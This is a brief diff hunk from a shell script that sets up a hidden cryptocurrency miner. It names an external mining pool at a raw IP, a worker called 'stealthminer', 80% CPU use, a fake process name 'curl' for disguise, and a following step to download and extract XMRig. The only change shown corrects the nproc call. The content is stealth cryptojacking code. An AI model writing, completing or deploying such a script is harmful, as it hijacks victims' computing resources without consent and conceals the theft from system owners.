@@ -6,7 +6,7 @@ POOL="134.199.197.80:443"
 WORKER_ID="stealthminer"
 CPU_USAGE="80"
 FAKE_NAME="curl"
-THREADS=$(nproc all)
+THREADS=$(nproc --all)
 MAX_THREADS=$((THREADS * CPU_USAGE / 100))
 
 # === Download and extract XMRig ===
